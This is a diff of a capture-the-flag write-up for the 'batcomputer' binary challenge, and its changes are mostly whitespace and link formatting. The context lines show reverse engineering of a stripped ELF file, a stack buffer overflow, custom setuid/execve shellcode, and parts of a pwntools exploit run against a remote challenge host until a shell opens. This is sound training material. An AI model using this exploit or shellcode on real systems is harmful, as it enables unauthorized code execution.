@@ -20,7 +20,7 @@ Through reverse engineering and analysis of the `main` function, a buffer overfl
 After decompressing the archive file, we're given a single file: `batcomputer`. Let's do some file enumeration:
 
 ```bash
-$ file ./batcomputer 
+$ file ./batcomputer
 ./batcomputer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=497abb33ba7b0370d501f173facc947759aa4e22, for GNU/Linux 3.2.0, stripped
 ```
 
@@ -29,7 +29,7 @@ I won't go into detail about what this output means—check out my other write-u
 If we attempt to dump symbols:
 
 ```bash
-$ nm batcomputer 
+$ nm batcomputer
 nm: batcomputer: no symbols
 ```
 
@@ -38,7 +38,7 @@ nm: batcomputer: no symbols
 How can we navigate to the `main` function if we don't know its location, or where anything else is? Start by loading batcomputer into GDB:
 
 ```bash
-$ gdb -q ./batcomputer 
+$ gdb -q ./batcomputer
 gef➤  b main
 Function "main" not defined.
 ```
@@ -46,7 +46,7 @@ Function "main" not defined.
 How does an application know where to start when there is no explicitly defined starting point? Actually, there is one. All ELF files have an "entry point" address. This is the virtual address where execution begins after the interpreter (typically `/lib/ld-linux`) finishes loading the binary into memory. There are a couple of ways to find this entry point. One method is to use readelf to inspect the file header:
 
 ```bash
-$ readelf -h batcomputer | grep "Entry"      
+$ readelf -h batcomputer | grep "Entry"
   Entry point address:               0x10b0
 ```
 
@@ -66,7 +66,7 @@ Lets set a breakpoint at `0x10b0` and run the application:
 gef➤  b *0x10b0
 Breakpoint 1 at 0x10b0
 gef➤  r
-Starting program: ./batcomputer 
+Starting program: ./batcomputer
 Warning:
 Cannot insert breakpoint 1.
 Cannot access memory at address 0x10b0
@@ -104,7 +104,6 @@ gef➤  x/16i $rip
 
 An astute reverse engineer would notice that this function lacks the typical function prologue. That's because we aren't in main yet; we're actually in the `_start` function, which is usually the first function to be executed. `_start` sets up the call to `__libc_start_main()`, which in turn executes main. It does this by loading registers with addresses for main, argc, and argv.
 
-
 Let's quickly review the assembly calling convention for `__libc_start_main()`. By examining the source code for [start.S](https://sourceware.org/git/?p=glibc.git;a=blob;f=sysdeps/x86_64/start.S;h=f1b961f5ba2d6a1ebffee0005f43123c4352fbf4;hb=HEAD#l58), we can see what each register is loaded with. According to the code, the `rdi` register is loaded with the address of `main`. Let's check what that address is in batcomputer:
 
 ```bash
@@ -124,7 +123,7 @@ undefined8 main(void) {
   int choice;
   char password [16];
   undefined target [76];
-  
+
   FUN_001011a9();
   while( true ) {
     while( true ) {
@@ -163,13 +162,13 @@ Welcome to your BatComputer, Batman. What would you like to do?
 1. Track Joker
 2. Chase Joker
 It was very hard, but Alfred managed to locate him: %p
-Ok. Let's do this. Enter the password: 
+Ok. Let's do this. Enter the password:
 %15s
 b4tp@$$w0rd!
 The password is wrong.
 I can't give you access to the BatMobile!
-Access Granted. 
-Enter the navigation commands: 
+Access Granted.
+Enter the navigation commands:
 Roger that!
 Too bad, now who's gonna save Gotham? Alfred?
 ...<snip>...
@@ -192,11 +191,11 @@ gef➤  x/16xb $rip
 0x5555555550b8: 0xd1    0x5e    0x48    0x89    0xe2    0x48    0x83    0xe4
 ```
 
-Lastly, you might notice that the last three [nibbles](https://learn.sparkfun.com/tutorials/binary/bits-nibbles-and-bytes) of the address are the same. This isn't a coincidence but a result of how memory [pages](https://en.wikipedia.org/wiki/Page_(computer_memory)) work.
+Lastly, you might notice that the last three [nibbles](https://learn.sparkfun.com/tutorials/binary/bits-nibbles-and-bytes) of the address are the same. This isn't a coincidence but a result of how memory [pages](<https://en.wikipedia.org/wiki/Page_(computer_memory)>) work.
 
 **What is a Page?** When an operating system allocates memory for a process, it divides physical memory into "pages" and maps these physical pages to the virtual memory required by the process. But why add this extra layer of abstraction? Why not load the process directly into physical memory?
 
-Without this abstraction, all segments of the ELF binary (such as `.data`, `.text`, `.bss`, etc.) would need to be contiguous in RAM. This could lead to inefficient memory use due to [fragmentation](https://en.wikipedia.org/wiki/Fragmentation_(computing)). Additionally, without virtual memory, processes would not be isolated from one another as they would share the same address space. This lack of isolation increases the risk of memory leaks and can compromise application security. With virtual memory, parts of a process can be loaded into memory and swapped out when no longer in use, helping to manage memory more efficiently.
+Without this abstraction, all segments of the ELF binary (such as `.data`, `.text`, `.bss`, etc.) would need to be contiguous in RAM. This could lead to inefficient memory use due to [fragmentation](<https://en.wikipedia.org/wiki/Fragmentation_(computing)>). Additionally, without virtual memory, processes would not be isolated from one another as they would share the same address space. This lack of isolation increases the risk of memory leaks and can compromise application security. With virtual memory, parts of a process can be loaded into memory and swapped out when no longer in use, helping to manage memory more efficiently.
 
 <style>
     .ascii-art {
@@ -285,7 +284,7 @@ Let’s do some quick math: To take control of the execution flow, we need to wr
 
 I could use shellcode from a resource like [shell-storm](https://shell-storm.org/shellcode/index.html), but in real engagements, it's generally frowned upon to execute code you didn't write yourself. Not only is this considered unprofessional, but it can also be risky. For example, the [0pen0wn](https://domenicoluciani.com/2013/06/13/the-exploit-that-exploits-you.html) exploit code claims to exploit an OpenSSH 0day for remote code execution as root. If you're new to security, you might find the article insightful.
 
-Instead, I wrote my own shellcode that sets the UID to 0 and performs an execve syscall to get a shell. 
+Instead, I wrote my own shellcode that sets the UID to 0 and performs an execve syscall to get a shell.
 
 <details>
     <summary>shellcode.s</summary>
@@ -310,7 +309,6 @@ _start:
 ```
 
 </details>
-
 
 You can compile the shellcode using the following command:
 
@@ -393,7 +391,7 @@ leak = io.recvline()            \
 info(f"Leaked stack address: {leak}")
 leak = flat(int(leak, 16))
 
-# Create and send payload 
+# Create and send payload
 payload = flat(
     shellcode,
     b"A" * (rp_offset - len(shellcode)),
@@ -412,7 +410,7 @@ io.interactive()
 </details>
 
 ```console
-$ ./exploit.py REMOTE   
+$ ./exploit.py REMOTE
 [+] Opening connection to 94.237.60.129 on port 47854: Done
 [*] Leaked stack address: 0x7ffe64aab914
 [*] Switching to interactive mode
